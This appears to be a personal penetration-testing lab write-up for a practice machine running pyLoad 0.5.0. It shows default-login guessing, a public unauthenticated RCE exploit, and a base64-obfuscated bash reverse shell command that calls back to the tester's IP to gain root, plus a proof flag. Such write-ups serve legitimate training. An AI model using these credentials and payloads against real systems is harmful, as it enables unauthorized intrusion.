---
title: PyLoader
date: 2025-11-20
---
Difficulty: Intermediate
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [x] 9666
- [ ] 22

# Service Enumeration
## 9666
![[Pasted image 20251120062740.png]]

Guess logins:
- admin:admin
- pyloader:pyloader
- pyload:pyload (success!)


![[Pasted image 20251120063008.png]]

I'm able to sign in with pyload:pyload!

![[Pasted image 20251120063047.png]]

/info gives a lot of information once logged in:
![[Pasted image 20251120063509.png]]

Download folder: /root/Downloads/pyLoad suggests that this server is running as root. If we can find code execution it may be as root as well, without need for privilege escalation.

It also gives us the exact version of Python and pyLoad (0.5.0).

Looking into pyLoad a bit more, I find an exploit allowing for unauthenticated RCE in this version:
https://www.exploit-db.com/exploits/51532

We could have found this first and ran it without even knowing the login credentials, but seeing the version was a good confirmation.

I'll start a reverse shell listener:
`penelope -p 80`

...and use this exploit POC to run a reverse shell payload:
`python3 51532.py -u http://192.168.195.26:9666 -c 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xOTYvODAgMD4mMSkgJg==|base64 -d|bash'`

As expected from our enumeration of the pyLoad app, we now have access as root!

![[Pasted image 20251120064502.png]]

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

/root/proof.txt
bc58b12436bc3dc3dfa490241b1576ae

![[Pasted image 20251120064622.png]]
